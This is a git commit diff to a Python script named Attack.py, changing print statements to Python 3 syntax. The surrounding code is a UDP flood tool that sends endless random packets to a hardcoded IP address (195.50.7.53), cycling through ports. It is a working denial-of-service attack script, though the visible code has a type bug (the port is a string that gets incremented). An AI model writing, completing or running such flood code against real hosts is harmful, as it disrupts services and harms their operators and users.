bf969dd28fc7eec9d55dc3985cf303c40719edb6
freethemesvk <55578496+freethemesvk@users.noreply.github.com>
2021-10-03 23:04:54 +0300

    Update Attack.py

--- Attack.py
+++ Attack.py
@@ -9,7 +9,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-print "Author   : c4md"
+print("Author   : c4md")
 
 ip = "195.50.7.53"
 port = "80"
@@ -19,4 +19,4 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
